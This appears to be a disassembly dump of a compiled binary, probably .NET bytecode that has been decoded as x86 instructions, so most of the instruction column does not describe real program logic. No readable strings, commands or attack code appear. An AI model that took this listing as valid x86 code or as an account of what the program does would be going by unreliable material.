  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 a2             	es jb  0x403674
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	b4 23                	mov    $0x23,%ah
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 1e 21 00       	and    $0x211e72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 ba                	jb     0x403734
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 d0 23 00       	and    $0x23d072,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 da 23 00       	and    $0x23da72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 e4 23 00       	and    $0x23e472,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 ea                	jb     0x4037b7
  4037cd:	23 00                	and    (%eax),%eax
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 fe             	or     -0x2(%edx),%dh
  4037d8:	23 00                	and    (%eax),%eax
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	02 24 00             	add    (%eax,%eax,1),%ah
  4037ec:	70 72                	jo     0x403860
  4037ee:	0c 24                	or     $0x24,%al
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 18             	or     0x18(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	24 24                	and    $0x24,%al
  4037ff:	00 70 6f             	add    %dh,0x6f(%eax)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 30 24 00       	and    $0x243072,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 3a 24 00       	and    $0x243a72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 4a 24 00       	and    $0x244a72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 56             	or     0x56(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	4a                   	dec    %edx
  40385e:	24 00                	and    $0x0,%al
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 60             	or     0x60(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	da 23                	fisubl (%ebx)
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 6c 24 00       	and    $0x246c72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 84 24 00       	and    $0x248472,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 96 24 00       	and    $0x249672,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 aa 24 00       	and    $0x24aa72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 be 24 00       	and    $0x24be72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 18                	jb     0x40390d
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 c8 24 00       	and    $0x24c872,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 d4             	adc    %esi,-0x2c(%edx)
  40399e:	24 00                	and    $0x0,%al
  4039a0:	70 28                	jo     0x4039ca
  4039a2:	8a 00                	mov    (%eax),%al
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	72 da                	jb     0x403982
  4039a8:	24 00                	and    $0x0,%al
  4039aa:	70 28                	jo     0x4039d4
  4039ac:	68 00 00 0a 72       	push   $0x720a0000
  4039b1:	06                   	push   %es
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 44    	or     0x44720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 5c                	jb     0x403a72
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 64             	add    %dh,0x64(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 5c                	jb     0x403aa3
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 18             	add    %dh,0x18(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
